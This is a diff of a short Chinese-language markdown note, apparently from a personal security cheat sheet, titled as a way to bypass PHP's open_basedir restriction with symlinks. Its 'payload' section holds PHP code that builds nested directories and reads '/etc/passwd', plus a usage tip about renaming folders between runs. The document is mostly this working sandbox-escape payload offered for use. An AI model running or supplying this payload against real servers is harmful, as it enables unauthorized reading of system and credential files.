@@ -1,5 +1,10 @@
-参考：
+# 利用symlink绕过open_basedir
+
+#### 参考
+
 - twitter
+
+#### payload
 
 ```php
 mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);
@@ -12,3 +17,4 @@ echo file_get_contents('bar/etc/passwd');
 ```
 
 每次要更换文件夹a和bar和foo，不然会报错文件已存在。
+
